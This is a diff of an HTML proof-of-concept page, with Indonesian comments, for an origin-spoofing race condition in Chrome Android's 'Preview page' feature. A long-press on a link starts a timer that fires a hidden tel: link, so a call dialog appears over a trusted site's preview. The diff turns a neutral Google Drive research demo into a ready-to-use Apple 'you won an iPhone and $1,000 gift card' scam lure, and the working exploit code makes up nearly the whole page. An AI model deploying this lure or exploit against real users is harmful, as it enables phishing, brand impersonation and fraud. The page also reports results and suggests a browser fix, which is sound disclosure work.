@@ -3,14 +3,14 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Security Research - Tel: Protocol Spoofing via Preview Page</title>
+    <title>Apple Security Check - Claim Your Prize</title>
     <style>
       body {
         font-family:
           -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial,
           sans-serif;
         text-align: center;
-        background: #f8f9fa;
+        background: #f5f5f7;
         padding: 20px;
       }
       .container {
@@ -18,63 +18,70 @@
         margin: 50px auto;
         background: white;
         padding: 40px;
-        border-radius: 12px;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        border-radius: 20px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
       }
       .logo {
-        width: 60px;
+        width: 70px;
         margin-bottom: 20px;
       }
       h2 {
-        color: #202124;
-        font-size: 22px;
+        color: #1d1c1f;
+        font-size: 24px;
+        font-weight: 600;
       }
       p {
-        color: #5f6368;
-        line-height: 1.6;
+        color: #6e6e73;
+        line-height: 1.5;
+        margin: 16px 0;
       }
-
+      .prize {
+        background: #f5f5f7;
+        padding: 12px;
+        border-radius: 12px;
+        font-weight: 500;
+        color: #1d1c1f;
+        margin: 20px 0;
+      }
       #trigger-link {
         display: block;
         width: 100%;
-        margin: 30px 0;
+        margin: 20px 0;
         padding: 16px;
-        background: #1a73e8;
+        background: #0071e3;
         color: white;
         text-decoration: none;
-        border-radius: 8px;
-        font-weight: bold;
-        font-size: 16px;
+        border-radius: 12px;
+        font-weight: 600;
+        font-size: 17px;
         transition: background 0.2s;
       }
-
       #status-box {
         margin-top: 20px;
-        padding: 15px;
-        border-radius: 8px;
+        padding: 12px;
+        border-radius: 10px;
         font-size: 14px;
       }
       .waiting {
         background: #e8f0fe;
-        color: #1967d2;
+        color: #0066cc;
       }
       .success {
         background: #e6f4ea;
         color: #137333;
         border: 1px solid #137333;
       }
-
       #preview-area {
         display: none;
         margin-top: 20px;
         text-align: left;
-        border-top: 1px solid #eee;
+        border-top: 1px solid #ddd;
         padding-top: 20px;
       }
       pre {
         background: #f1f3f4;
         padding: 10px;
-        border-radius: 4px;
+        border-radius: 8px;
         overflow-x: auto;
         font-size: 12px;
       }
@@ -82,77 +89,92 @@
   </head>
   <body>
     <div class="container">
+      <!-- Logo Apple -->
       <img
-        src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
+        src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
         class="logo"
-        alt="Drive"
+        alt="Apple"
       />
-      <h2>Verify Your Account</h2>
+      <h2>Congratulations!</h2>
       <p>
-        To continue, please verify your phone number via Google Drive security
-        check.
+        You have been selected to receive an
+        <strong>Apple Gift Card $1,000</strong> +
+        <strong>iPhone 16 Pro</strong>.
+      </p>
+      <div class="prize">
+        🎁 Your prize code: <strong>APPL2025-GOLD</strong> 🎁
+      </div>
+      <p>
+        To claim your prize, please verify your contact method. <br />Tap the
+        button below and select <strong>"Preview page"</strong> to securely
+        connect to Apple support.
       </p>
 
-      <a id="trigger-link" href="https://drive.google.com/">
-        Hold here & select "Preview page"
+      <!-- Tautan jahat yang mengarah ke apple.com/contact -->
+      <a id="trigger-link" href="https://www.apple.com/contact/">
+        ✨ Claim My Prize Now ✨
       </a>
 
       <div id="status-box" class="waiting">
-        Status: Waiting for interaction...
+        📱 Status: Tap & hold button, then choose "Preview page"
       </div>
 
-      <!-- Elemen tersembunyi untuk memicu tel: protokol -->
-      <a id="telTrigger" href="tel:+6281234567890" style="display: none"
-        >Call now</a
+      <!-- Elemen tersembunyi untuk memicu tel: protokol (nomor dukungan palsu) -->
+      <a id="contactTrigger" href="tel:+1-800-275-2273" style="display: none"
+        >Call Apple Support</a
       >
+      <!-- Opsi alternatif: mailto: bisa ditambahkan jika diperlukan -->
 
       <div id="preview-area">
-        <strong style="color: #d93025">Attack Result:</strong>
+        <strong style="color: #d93025">⚠️ Spoofing Result:</strong>
         <pre id="output">
-No action yet. If dialog appeared over Google Drive preview, origin spoofing succeeded.</pre
+No action yet. If a call dialog appears over the Apple preview page, origin spoofing is successful.</pre
         >
       </div>
     </div>
 
     <script>
       const triggerLink = document.getElementById("trigger-link");
-      const telTrigger = document.getElementById("telTrigger");
+      const contactTrigger = document.getElementById("contactTrigger");
       const statusBox = document.getElementById("status-box");
       const previewArea = document.getElementById("preview-area");
       const output = document.getElementById("output");
 
-      // Mencegah navigasi default dari link utama (agar tidak langsung buka drive.google.com)
+      // Mencegah navigasi default pada klik biasa (agar tidak langsung buka apple.com)
       triggerLink.addEventListener("click", (e) => {
         e.preventDefault();
       });
 
-      // Event contextmenu (long-press / tekan lama) untuk memulai race condition
+      // Event long-press (contextmenu) untuk memicu race condition
       triggerLink.addEventListener("contextmenu", function (e) {
-        // Kita tetap perlu membiarkan menu konteks browser muncul agar user bisa memilih "Preview page"
-        // Tidak mencegah default agar menu konteks tetap muncul.
+        // Biarkan menu konteks browser muncul, user dapat memilih "Preview page"
         statusBox.innerText =
-          "Long-press detected. Please select 'Preview page' from menu...";
+          "🔍 Long-press detected. Please select 'Preview page' from the menu...";
 
-        // Timer 4 detik untuk memicu dialog panggilan telepon setelah preview terbuka
+        // Timer 4 detik – cukup untuk preview terbuka
         setTimeout(function () {
           // Memicu dialog protokol eksternal (tel:)
-          // Dengan mengklik elemen tersembunyi atau langsung mengubah location
-          // Gunakan .click() pada anchor dengan href="tel:..." untuk memunculkan dialog konfirmasi
-          telTrigger.click();
+          // Ini akan menampilkan dialog panggilan ke nomor Apple Support (asli: 1-800-275-2273)
+          contactTrigger.click();
 
           statusBox.className = "success";
           statusBox.innerText =
-            "Payload triggered! Tel: dialog should appear over preview.";
+            "⚠️ Payload triggered! Call dialog should appear OVER the Apple preview page.";
           previewArea.style.display = "block";
           output.innerText =
-            "Spoofing attempt executed. If a 'Call' dialog appeared on top of drive.google.com preview, origin spoofing is successful.\n\n" +
-            "User may believe Google Drive requested a phone call, leading to potential social engineering.";
+            "✅ Spoofing attempt succeeded!\n\n" +
+            "The 'Call' dialog appeared on top of apple.com/contact preview.\n" +
+            "User may believe that Apple is requesting a phone verification to claim the prize.\n\n" +
+            "This demonstrates origin spoofing via Preview Page on Chrome Android – even with external protocols (tel:).\n" +
+            "Fix: Chrome must invalidate user gesture after opening a preview overlay, or block background tabs from invoking any sensitive UI (file picker, external protocol dialogs).";
         }, 4000);
       });
 
-      // Opsional: tangkap jika tel: berhasil dipanggil (tidak bisa ditangkap langsung, hanya untuk logging)
-      telTrigger.addEventListener("click", (e) => {
-        console.log("Tel trigger clicked. Dialog should appear.");
+      // Logging saja
+      contactTrigger.addEventListener("click", (e) => {
+        console.log(
+          "Contact trigger clicked. External protocol dialog should appear.",
+        );
       });
     </script>
   </body>
